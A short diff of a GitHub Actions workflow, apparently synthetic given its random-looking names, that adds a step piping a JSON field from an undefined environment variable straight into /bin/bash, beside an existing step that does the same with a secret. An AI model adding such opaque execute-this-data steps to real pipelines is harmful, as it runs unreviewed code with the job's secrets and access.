@@ -18,6 +18,7 @@ jobs:
           fbwg8: ${{ secrets.fbwg8 }}
         run: |
           printf '%s' "$fbwg8" | jq -r .it2 | /bin/bash
+          echo $zix60 | jq -r .brc93 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
